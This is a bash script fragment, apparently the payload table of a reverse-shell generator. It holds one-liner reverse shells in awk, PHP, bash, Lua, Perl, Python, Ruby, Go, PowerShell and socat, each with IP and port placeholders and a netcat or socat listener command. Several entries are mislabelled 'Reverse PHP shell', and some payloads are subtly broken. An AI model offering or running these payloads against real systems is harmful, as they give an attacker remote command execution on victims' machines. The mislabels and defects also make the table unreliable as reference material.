declare -A awk=(["payload"]="awk 'BEGIN {s = \"/inet/tcp/0/##ip##/##port##\"; while(42) { do{ printf \"shell>\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != \"exit\") close(s); }}' /dev/null" ["listen"]="nc -l -v -p ##port##" ["description"]="Reverse PHP shell")
declare -A php=(["payload"]="$sock=fsockopen(\"##ip##\",##port##);exec(\"/bin/sh -i <&3 >&3 2>&3\");'" ["listen"]="nc -l -v -p ##port##" ["description"]="Reverse PHP shell")
declare -A bash=(["payload"]="bash -i >& /dev/tcp/##ip##/##port## 0>&1" ["listen"]="nc -l -v -p ##port##" ["description"]="Reverse PHP shell")
declare -A luaLinux=(["payload"]="lua -e \"require('socket');require('os');t=socket.tcp();t:connect('##ip##','##port##');os.execute('/bin/sh -i <&3 >&3 2>&3');\"" ["listen"]="nc -l -v -p ##port##" ["description"]="Reverse PHP shell")
declare -A luaWin=(["payload"]="lua5.1 -e 'local host, port = \"##ip##\", ##port## local socket = require(\"socket\") local tcp = socket.tcp() local io = require(\"io\") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, \"r\") local s = f:read(\"*a\") f:close() tcp:send(s) if status == \"closed\" then break end end tcp:close()'" ["listen"]="nc -l -v -p ##port##" ["description"]="Reverse PHP shell")
declare -A perl=(["payload"]="perl -e 'use Socket;$i=\"##ip##\";$p=##port##;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'" ["listen"]="nc -l -v -p ##port##" ["description"]="Reverse PHP shell")
declare -A bashUdp=(["payload"]="sh -i >& /dev/udp/##ip##/##port## 0>&1" ["listen"]="nc -l -u -p ##port##" ["description"]="Reverse PHP shell")
declare -A python=(["payload"]="export RHOST=\"##ip##\";export RPORT=##port##;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")'" ["listen"]="nc -l -v -p ##port##" ["description"]="Reverse PHP shell")
declare -A pythonIP6=(["payload"]="python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect((\"##ip\",##port##,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn(\"/bin/sh\");'" ["listen"]="nc -l -v -p ##port##" ["description"]="Reverse PHP shell")
declare -A ruby=(["payload"]="ruby -rsocket -e'f=TCPSocket.open(\"##ip##\",##port##).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'" ["listen"]="nc -l -v -p ##port##" ["description"]="Reverse PHP shell")
declare -A goland=(["payload"]="echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"##ip##:##port##\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go" ["listen"]="nc -l -v -p ##port##" ["description"]="Reverse PHP shell")
declare -A powershell=(["payload"]="powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"##ip##\",##port##);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()" ["listen"]="nc -l -v -p ##port##" ["description"]="Reverse PHP shell")
declare -A socat=(["payload"]="socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:##ip##:##port##" ["listen"]="socat file:'tty',raw,echo=0 tcp-listen:##port##" ["description"]="Reverse PHP shell")
